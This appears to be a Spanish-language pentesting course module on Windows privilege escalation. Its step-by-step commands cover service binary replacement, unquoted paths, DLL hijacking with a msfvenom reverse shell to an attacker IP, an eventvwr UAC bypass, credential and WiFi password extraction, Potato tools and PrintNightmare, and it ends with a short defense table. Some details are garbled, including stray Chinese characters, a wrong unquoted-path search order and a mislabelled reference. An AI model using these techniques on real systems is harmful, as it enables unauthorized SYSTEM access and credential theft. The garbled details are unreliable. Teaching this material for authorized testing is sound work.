# 🔐 Escalada de Privilegios en Windows

> *"Obtuviste una shell como usuario normal en Windows. El objetivo es SYSTEM o Administrator. Este documento cubre las vectors de escalada que encontrarás en entornos reales."*

---

## 📋 Tabla de contenido

1. [Enumeración inicial](#1-enumecion-inicial)
2. [Service misconfigurations](#2-service-misconfigurations)
3. [Unquoted service paths](#3-unquoted-service-paths)
4. [DLL hijacking](#4-dll-hijacking)
5. [Token impersonation](#5-token-impersonation)
6. [UAC bypass](#6-uac-bypass)
7. [Stored credentials](#7-stored-credentials)
8. [Registry autorun](#8-registry-autorun)
9. [Potato attacks](#9-potato-attacks)
10. [Kernel exploits](#10-kernel-exploits)
11. [Herramientas automatizadas](#11-herramientas-automatizadas)
12. [Defensa y remediación](#12-defensa-y-remediación)
13. [Referencias](#13-referencias)

---

## 1. Enumeración inicial

### Información del sistema

```powershell
# Sistema operativo y arquitectura
systeminfo
hostname
# Buscar hotfixes instalados
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Arquitectura
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture
```

### Usuarios y grupos

```powershell
# Quién soy
whoami
whoami /priv
whoami /groups

# Usuarios del sistema
net user
net localgroup administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"

# Usuarios con logon interactivo
wmic useraccount get name,sid
```

### Procesos y servicios

```powershell
# Procesos en ejecución
tasklist /svc
wmic process list full
wmic process get name,processid,parentprocessid,commandline

# Servicios
wmic service list full
wmic service get name,displayname,pathname,startmode
sc query

# Servicios que corren como SYSTEM
wmic service where "startmode='auto'" get name,pathname
```

### Red

```powershell
# Interfaces de red
ipconfig /all
route print
arp -a

# Puertos abiertos
netstat -ano
netstat -anob  # Con proceso (requiere admin)

# Conexiones activas
netstat -an | findstr ESTABLISHED
```

### Programas instalados

```powershell
wmic product get name,version
wmic qfe get hotfixid,description,installedon  # Hotfixes
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 2>nul
```

---

## 2. Service misconfigurations

Los servicios de Windows son una de las vectores más comunes para escalada.

### Enumerar servicios

```powershell
# Todos los servicios con sus paths
wmic service list full

# Servicios con path explotable
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """

# Servicios que corren como SYSTEM
sc qc <service_name>
```

### Vector: service binary replacement

Si puedes escribir en la ruta del binary de un servicio:

```powershell
# 1. Detectar servicio con path世界writable
wmic service get name,pathname
# VulnerableService  C:\Program Files\Vulnerable\service.exe

# 2. Verificar permisos del directorio
icacls "C:\Program Files\Vulnerable\"
# Everyone:(OI)(CI)(F)  ← ¡Escritura total!

# 3. Detener el servicio
sc stop VulnerableService

# 4. Copiar tu binary
copy C:\Users\victim\shell.exe "C:\Program Files\Vulnerable\service.exe"

# 5. Iniciar el servicio
sc start VulnerableService
# → Shell como SYSTEM
```

### Vector: service unquoted path

Si el path del servicio no está entre comillas y contiene espacios:

```powershell
# Servicio vulnerable
wmic service get name,pathname | findstr /i "program"
# VulnService  C:\Program Files\Vulnerable\service.exe
# ↑ Sin comillas, hay espacio después de "Program"

# 1. Verificar que el directorio es world-writable
icacls "C:\Program Files\"
# Everyone:(OI)(CI)(F)

# 2. Crear binary malicioso
copy C:\Users\victim\shell.exe "C:\Program.exe"

# 3. Reiniciar servicio
sc stop VulnService
sc start VulnService
# Windows busca: C:\Program.exe → ejecuta tu binary
```

---

## 3. Unquoted service paths

Explicación detallada del vector anterior.

### Cómo funciona

Cuando un servicio tiene un path como `C:\Program Files\Vulnerable\service.exe` sin comillas, Windows intenta ejecutar en este orden:

```
1. C:\Program.exe
2. C:\Program Files\Vulnerable\service.exe
3. C:\Program Files\Vulnerable\service.exe (si existe)
```

Si `C:\Program.exe` o `C:\Program Files\Vulnerable\service.exe` existen y son世界writable, puedes inyectar tu binary.

### Detectar

```powershell
# Buscar servicios con paths sin comillas
wmic service get name,pathname | findstr /i /v "windows" | findstr /i /v """

# O con PowerShell
Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '}
```

---

## 4. DLL hijacking

Si una aplicación busca una DLL que no existe o que puedes sobrescribir.

### Vector: DLL search order hijacking

```powershell
# 1. Detectar DLLs faltantes (usando ProcMon o Process Monitor)
# Filtrar por "NAME NOT FOUND" en el path de búsqueda

# 2. Crear DLL maliciosa
# En Linux con mingw-w64:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll

# 3. Copiar al directorio donde la app busca la DLL
copy hijack.dll "C:\Program Files\VulnerableApp\missing.dll"

# 4. Ejecutar la aplicación
"C:\Program Files\VulnerableApp\app.exe"
```

### DLL search order

```
1. Directorio del ejecutable
2. Directorio del sistema (C:\Windows\System32)
3. Directorio de Windows (C:\Windows)
4. Directorio actual
5. PATH
```

### Detectar con Process Monitor

```
1. Descargar ProcMon de Sysinternals
2. Filtrar: Result = NAME NOT FOUND
3. Filtrar: Path ends with .dll
4. Ejecutar la aplicación sospechosa
5. Ver qué DLLs busca y no encuentra
```

---

## 5. Token impersonation

Windows mantiene tokens de autenticación que pueden ser impersonados.

### Verificar privilegios

```powershell
# Ver todos los privilegios del usuario actual
whoami /priv

# Privilegios clave para impersonation:
# SeImpersonatePrivilege  → ¡Puedes impersonar tokens!
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
```

### Token types

| Tipo | Descripción | Ejemplo |
|---|---|---|
| **Delegate** | Puede impersonar a cualquier usuario en cualquier máquina | Tokens delegados por RDP |
| **Impersonate** | Puede impersonar solo en la máquina local | Servicios IIS, SQL Server |
| **Primary** | Token del proceso | Tu sesión de login |

### Impersonate con Metasploit

```bash
# En tu sesión Meterpreter
load incognito

# Listar tokens disponibles
list_tokens -u

# Impersonar token de Administrator
impersonate_token "NT AUTHORITY\SYSTEM"
impersonate_token "CORP\Administrator"
```

### Potato attacks (ver sección 9)

Los Potato attacks convierten tokens **Impersonate** en acceso **SYSTEM**.

---

## 6. UAC bypass

UAC (User Account Control) filtra permisos administrativos. Hay varias formas de bypass.

### UACME project

El proyecto UACME cataloga más de 60 métodos de bypass:
[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

### Métodos comunes

| Método | EID | Binary utilizado |
|---|---|---|
| **Event Viewer** | 1 | `eventvwr.exe` → busca `mmc.exe` en registry |
| **ComputerDefaults** | 15 | `computerdefaults.exe` |
| **SDCLT** | 16 | `sdclt.exe` → ejecuta `cmd.exe` |
| **Fodhelper** | 33 | `fodhelper.exe` → busca en registry |

### Ejemplo: Event Viewer bypass

```powershell
# 1. Verificar UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# EnableLUA    0x1 (UAC activado)

# 2. Modificar registry (usuario necesita poder escribir aquí)
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "C:\Users\victim\shell.exe" /f

# 3. Ejecutar eventvwr
eventvwr.exe
# Windows busca mmc.exe → ejecuta tu shell.exe en su lugar

# 4. Resultado: shell como Administrator sin prompt de UAC
```

---

## 7. Stored credentials

Windows guarda credenciales que pueden ser extraídas.

### Verificar credenciales guardadas

```powershell
# Credenciales de RDP
cmdkey /list
# Target: Domain:interactive=administrator
# Tipo: Domain Password

# Si hay credenciales guardadas, puedes usarlas
runas /savecred /user:administrator C:\Users\victim\shell.exe
```

### WiFi passwords

```powershell
# Listar perfiles WiFi
netsh wlan show profiles

# Ver passwords guardadas
netsh wlan show profile name="NetworkName" key=clear
# Key Content: MyPassword123
```

### Vault passwords

```powershell
# Herramienta para extraer vault passwords
# https://github.com/GhostPack/SharpDPAPI
# https://github.com/GhostPack/Seatbelt

# Buscar credenciales en vault
vaultcmd /listproperties:CredHist
vaultcmd /listcreds:CredHist /all
```

### Browser passwords

```powershell
# Chrome almacena passwords en:
%LocalAppData%\Google\Chrome\User Data\Default\Login Data

# Firefox en:
%AppData%\Mozilla\Firefox\Profiles\*.default\logins.json

# Herramientas para extraer
# SharpChrome: https://github.com/GhostPack/SharpDPAPI
# Mimikatz: sekurlsa::dpapi
```

---

## 8. Registry autorun

Si puedes modificar claves de autorun, tu binary se ejecuta cada vez que alguien hace login.

### Localizar autoruns

```powershell
# Autorun keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Verificar permisos de escritura
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Si puedes escribir aquí, tu binary se ejecuta en cada login
```

### Ejemplo

```powershell
# 1. Verificar permisos
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SecurityApp"
# Output: SecurityApp  C:\Program Files\SecurityApp\app.exe

# 2. Verificar si puedes modificar
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SecurityApp" /t REG_SZ /d "C:\Users\victim\shell.exe" /f

# 3. Esperar a que alguien haga login (o reiniciar)
```

---

## 9. Potato attacks

Los Potato attacks son una familia de exploits que abusan de tokens de servicio NT AUTHORITY\SYSTEM.

### Tipos de Potato

| Attack | Vector | Servicio abusado |
|---|---|---|
| **RottenPotato** | HTTP → NTLM | Windows Update, Spooler |
| **JenkinsPotato** | HTTP → NTLM | Jenkins |
| **PrintSpoofer** | Spooler | Print Spooler |
| **GodPotato** | .NET | Múltiples |

### PrintSpoofer

```powershell
# Compilar o descargar binario
# https://github.com/itm4n/PrintSpoofer

# Ejecutar
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -i -c "powershell.exe"

# Resultado: SYSTEM shell
```

### JuicyPotato

```powershell
# Requiere: SeImpersonatePrivilege + Windows Server 2008/2012
# https://github.com/ohpe/juicy-potato

# Ejecutar
JuicyPotato.exe -l 1337 -p C:\Users\victim\shell.exe -t * -c {CLSID}

# CLSIDs varían por versión de Windows
# https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

### SweetPotato

```powershell
# Versión más reciente y confiable
# https://github.com/CCob/SweetPotato

SweetPotato.exe -p C:\Users\victim\shell.exe
```

---

## 10. Kernel exploits

### Identificar versión de Windows

```powershell
systeminfo
# Output incluye:
# OS Name: Microsoft Windows Server 2016 Standard
# OS Version: 10.0.14393 N/A Build 14393
# System Type: x64-based PC
# Hotfix(s): 5 Hotfix(s) Installed
```

### Buscar exploits

```powershell
# Con searchsploit
searchsploit "windows server 2016 privilege escalation"

# Con Windows Exploit Suggester
# https://github.com/AonCyberLabs/Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
```

### Kernel exploits comunes

| CVE | Nombre | OS afectado |
|---|---|---|
| CVE-2021-1675 | PrintNightmare | Windows Server 2019 / Windows 10 |
| CVE-2021-34527 | PrintNightmare RCE | Windows Server 2019 / Windows 10 |
| CVE-2020-0787 | BITS | Windows 7/8/Server 2008/2012 |
| CVE-2016-3225 | SMB | Windows 7/8/Server 2008/2012 |
| CVE-2014-4113 | Win32k.sys | Windows 7/8/Server 2008/2012 |

### Ejemplo: PrintNightmare

```powershell
# 1. Verificar si Print Spooler está activo
sc query spooler

# 2. Descargar exploit
# https://github.com/cube0x0/CVE-2021-1675

# 3. Ejecutar (requiere PowerShell)
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123"

# 4. Login con el usuario creado
net user hacker Password123 /add
net localgroup administrators hacker /add
```

---

## 11. Herramientas automatizadas

### WinPEAS

```powershell
# Descargar
# https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

# Ejecutar
.\winPEASany.exe
.\winPEASany.exe quiet fast  # Solo resultados interesantes

# Guardar output
.\winPEASany.exe > winpeas_output.txt 2>&1
```

**WinPEAS busca:**
- Services con permisos débiles
- Unquoted service paths
- DLL hijacking
- Stored credentials
- Autorun registry
- Token privileges
- Kernel vulnerabilities

### PowerUp

```powershell
# Importar en PowerShell
Import-Module .\PowerUp.ps1

# Buscar todas las vector
Invoke-AllChecks

# Vector específicas
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
Write-ServiceBinary -Name "VulnService" -Path "C:\Users\victim\shell.exe"
```

### SharpUp

```powershell
# Versión en C# de PowerUp
.\SharpUp.exe audit

# Output en JSON
.\SharpUp.exe audit --json
```

### Seatbelt

```powershell
# Recolección de información del sistema
.\Seatbelt.exe -group=user    # Info del usuario
.\Seatbelt.exe -group=system  # Info del sistema
.\Seatbelt.exe -group=misc    # Info variada
```

---

## 12. Defensa y remediación

### Para Blue Team / Administradores

| Vector | Detección | Mitigación |
|---|---|---|
| **Service misconfigs** | Auditar permisos de servicios regularmente | Principio de mínimo privilegio para servicios |
| **Unquoted paths** | `wmic service` + audit de paths | Usar comillas en paths de servicios |
| **DLL hijacking** | Process Monitor en producción | Usar paths absolutos para DLLs |
| **Token impersonation** | Monitorear `SeImpersonatePrivilege` | Limitar servicios con este privilegio |
| **Stored credentials** | Auditar `cmdkey /list` | No guardar credenciales en producción |
| **Potato attacks** | Monitorear Print Spooler | Deshabilitar si no se usa |

### Configuración segura

```powershell
# 1. Verificar y limpiar services
wmic service get name,pathname | findstr /i /v "c:\windows"

# 2. Eliminar credenciales guardadas
cmdkey /delete:*  # Eliminar todas las credenciales

# 3. Deshabilitar Print Spooler si no se usa
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled

# 4. Verificar UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# Debe ser 0x1

# 5. Auditoría de autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Verificar que todos los paths son legítimos
```

---

## 13. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **GTFOBins (Windows)** | [https://lolbas-project.github.io](https://lolbas-project.github.io) |
| **WinPEAS** | [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
| **UACME** | [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME) |
| **HackTricks — Windows** | [https://book.hacktricks.xyz/windows-hardening](https://book.hacktricks.xyz/windows-hardening) |
| **MITRE ATT&CK — T1548** | [https://attack.mitre.org/techniques/T1548/](https://attack.mitre.org/techniques/T1548/) |

### CVEs comunes

| CVE | Nombre | Impacto |
|---|---|---|
| CVE-2021-1675 | PrintNightmare | RCE + Escalada |
| CVE-2020-0787 | BITS | Escalada a SYSTEM |
| CVE-2014-4113 | Win32k.sys | Escalada a SYSTEM |

### LOLBAS

Living Off The Land Binaries — binarios de Windows que pueden ser abusados:
[https://lolbas-project.github.io](https://lolbas-project.github.io)

---

## 📝 Entregable de portafolio

```markdown
# Escalada de Privilegios Windows — [Nombre del sistema]

## Contexto
- SO: Windows Server 2016 (Build 14393)
- Usuario inicial: victim (uid=1001)
- Herramienta de enumeración: WinPEAS

## Vector encontrado
- Service: VulnService (C:\Program Files\Vulnerable\service.exe)
- Permisos: Everyone:(OI)(CI)(F)
- Path sin comillas (unquoted)

## Explotación paso a paso
1. `wmic service get name,pathname` → path sin comillas
2. `icacls "C:\Program Files\Vulnerable\"` → world-writable
3. `sc stop VulnService`
4. `copy shell.exe "C:\Program.exe"`
5. `sc start VulnService`

## Resultado
- NT AUTHORITY\SYSTEM

## Remediación
- Usar comillas en paths de servicios
- Restrict permisos de directorio

## Evidencia
- Screenshot: [enlace]
- Output de comandos: [enlace]
```

---

**[⬅ Escalada Linux](./01-linux-privesc.md)** · **[⬅ Volver al módulo](../README.md)** · **[→ Persistencia Linux](../persistence/01-linux-persistence.md)**
